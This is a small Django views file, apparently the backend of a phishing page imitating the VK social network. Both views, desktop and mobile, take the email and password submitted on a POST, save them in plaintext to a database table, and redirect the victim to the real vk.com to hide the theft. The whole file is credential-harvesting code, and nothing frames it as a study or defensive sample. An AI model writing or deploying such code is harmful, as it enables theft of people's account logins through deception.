from django.http import HttpResponseRedirect
from django.shortcuts import render
from .models import User


def vk(request):
    if request.method == "POST" and request.POST['email'] != '' and request.POST['password'] != '':
        User.objects.create(user_login=request.POST['email'], user_password=request.POST['password'])
        return HttpResponseRedirect(r'http://www.vk.com/')
    else:
        return render(request, 'index.html')

def mobile_vk(request):
    if request.method == "POST" and request.POST['email'] != '' and request.POST['password'] != '':
        User.objects.create(user_login=request.POST['email'], user_password=request.POST['password'])
        return HttpResponseRedirect(r'http://www.vk.com/')
    else:
        return render(request, 'index_mobile.html')